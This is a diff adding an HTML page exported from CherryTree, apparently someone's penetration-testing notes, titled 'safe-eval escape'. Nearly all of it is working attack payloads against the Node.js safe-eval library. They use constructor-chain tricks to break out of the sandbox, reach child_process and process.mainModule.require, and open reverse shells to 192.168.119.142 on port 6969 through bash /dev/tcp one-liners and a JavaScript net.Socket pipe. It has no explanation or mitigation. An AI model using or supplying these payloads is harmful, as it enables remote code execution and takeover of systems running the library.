@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>safe-eval escape</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">safe-eval escape</h1><br/><strong>Reverse shell payload with the bash-one-line:</strong><br />safeEval("this.constructor.constructor('return child_process')().exec('bash -i &gt;&amp; /dev/tcp/192.168.119.142/6969 0&gt;&amp;1')");<br /><br /><strong>Reverse shell payload with JavaScript:</strong><br />safeEval("net = this.constructor.constructor('return net')(), sh = this.constructor.constructor('return child_process')().exec('/bin/bash');client = new net.Socket();client.connect(6969, '192.168.119.142', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});");<br /><br /><strong>If </strong><strong><code>require</code></strong><strong> is not available, to obtain the </strong><strong><code>require</code></strong><strong> by:</strong><br />process = this.constructor.constructor('return (function(){return process})()')();<br />var require = process.mainModule.require;<br /><br /><strong>If you are able to define an arbitrary function in the program: </strong><br />var context= {world: function () { return child_process.exec("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.119.142/6969 0&gt;&amp;1'")}}<br />safeEval('{hello: world()}',context)</div></body></html>
